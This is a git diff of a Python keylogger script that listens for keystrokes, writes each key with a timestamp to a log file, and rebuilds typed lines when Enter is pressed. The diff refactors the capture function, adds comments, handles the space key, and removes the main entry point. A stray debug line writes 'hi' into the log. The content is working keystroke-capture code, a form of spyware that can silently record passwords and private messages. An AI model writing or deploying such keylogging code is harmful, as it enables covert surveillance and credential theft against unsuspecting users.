@@ -13,21 +13,29 @@ def listen():
         key_listener.join()
 
 
+#
+# handle key press actions
+#
 def press_action(key):
     if key == Key.enter:
-        capture("[Enter]", True)
+        capture(key, "[Enter]", True)
     elif key == Key.backspace:
         if len(captured) > 0:
             captured.pop()
+    elif key == Key.space:
+        capture(key, " ", False)
     else:
-        capture(str(key).replace('\'', '', 2), False)
+        capture(key, str(key).replace('\'', '', 2), False)
 
 
-def capture(key, finalize):
+#
+# Gets the data of the pressed key and store them
+#
+def capture(key, value, finalize):
     file = open(file_name, "a")
     file.write("hi")
-    captured.append(key)
-    file.write(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + " " * 5 + key + "\n")
+    captured.append(value)
+    file.write(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + " " * 5 + str(key) + "\n")
     if finalize:
         line = ""
         for letter in captured:
@@ -35,11 +43,3 @@ def capture(key, finalize):
         file.write(line + "\n")
         file.write("_" * 50 + "\n")
         captured.clear()
-
-
-def main():
-    listen()
-
-
-if __name__ == "__main__":
-    main()
